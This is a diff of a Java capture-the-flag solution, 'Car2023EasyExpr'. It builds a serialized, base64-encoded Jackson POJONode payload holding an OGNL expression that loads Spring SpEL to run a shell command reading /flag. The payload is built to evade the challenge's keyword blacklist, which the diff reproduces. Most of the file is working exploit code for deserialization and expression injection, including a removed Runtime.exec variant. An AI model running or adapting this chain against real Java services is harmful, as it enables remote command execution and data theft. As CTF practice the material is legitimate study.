@@ -1,22 +1,14 @@
 package dev.silente.javashark.solution;
 
 
-import com.ctf.expr.entity.User;
 import com.fasterxml.jackson.databind.node.POJONode;
-import dev.silente.javashark.gadget.springboot.GPOJONode;
 import dev.silente.javashark.utils.MiscUtils;
 import dev.silente.javashark.utils.SerializeUtils;
 import ognl.Ognl;
 import ognl.OgnlContext;
-import org.springframework.expression.spel.standard.SpelExpressionParser;
+import ognl.OgnlException;
 
-import java.io.BufferedInputStream;
-import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.lang.reflect.Method;
-import java.net.URLDecoder;
-import java.util.Arrays;
+import java.io.*;
 
 public class Car2023EasyExpr {
 
@@ -138,30 +130,87 @@ public class Car2023EasyExpr {
     }
 
     public static void main(String[] args) throws Exception {
-
         String spel = "new java.util.Scanner(new java.lang.ProcessBuilder(\"cat\", \"/flag\").start().getInputStream(), \"GBK\").useDelimiter(\"asfsfsdfsf\").next()";
         String expr = generateChar() +
                 "(#el = #this.getClass().forName(" + makeString("org.springframework.expression.spel.standard.SpelExpressionParser") +").newInstance())." +
                 "(#input = #el.parseExpression(" + makeString(spel) + ").getValue())";
-
-//        String expr = generateChar() +
-//                "(#runtime = #this.getClass().forName(" + makeString("java.lang.Runtime") +"))." +
-//                "(#getMethod = #runtime.getMethods[6])." +
-//                "(#runMethod = #runtime.getMethods[13])." +
-//                "(#instine = #getMethod.invoke(null, null))." +
-//                "(#result = #runMethod.invoke(#instine, " + makeString("whoami") + ").getInputStream())." +
-//                "(#result.read())";
-
-
-//        OgnlContext ognlContext = new OgnlContext();
-//        System.out.println(Ognl.getValue(expr, ognlContext).toString());
-
-
         User user = new User("foo", "bar", expr);
         Object pojo = new POJONode(user);
         String code = MiscUtils.base64Encode(SerializeUtils.serialize(pojo));
         System.out.println(code);
 
         System.out.println(pojo);
+    }
+}
+
+
+
+/* Car2023 EasyExpr */
+class User implements Serializable {
+    private String username;
+
+    private String password;
+
+    private String expr;
+
+    public User() {}
+
+    public User(String username, String password, String expr) {
+        this.username = username;
+        this.password = password;
+        this.expr = expr;
+    }
+
+    public String getUsername() {
+        return this.username;
+    }
+
+    public void setUsername(String username) {
+        this.username = username;
+    }
+
+    public String getPassword() {
+        return this.password;
+    }
+
+    public void setPassword(String password) {
+        this.password = password;
+    }
+
+    public String getExpr() {
+        return this.expr;
+    }
+
+    public void setExpr(String expr) {
+        this.expr = expr;
+    }
+
+    public Boolean filter() {
+        String[] BlackList = {
+                "\"", "'", "\\u", "invoke", "getClass", "\\x", "$", "{", "}", "@",
+                "js", "getRuntime", "java", "script", "ProcessBuilder", "start", "flag" };
+//        String[] BlackList = {};
+        String str = this.expr.toLowerCase();
+        for (String keyword : BlackList) {
+            if (str.contains(keyword))
+                return Boolean.valueOf(true);
+        }
+        return Boolean.valueOf(false);
+    }
+
+    public String getResult() {
+        System.out.println("getResult");
+        try {
+            if (!filter().booleanValue()) {
+                OgnlContext ognlContext = new OgnlContext();
+                return Ognl.getValue(this.expr, ognlContext).toString();
+            }
+            else {
+                System.out.println("NONONO");
+            }
+        } catch (OgnlException var2) {
+            return "fail";
+        }
+        return "fail";
     }
 }
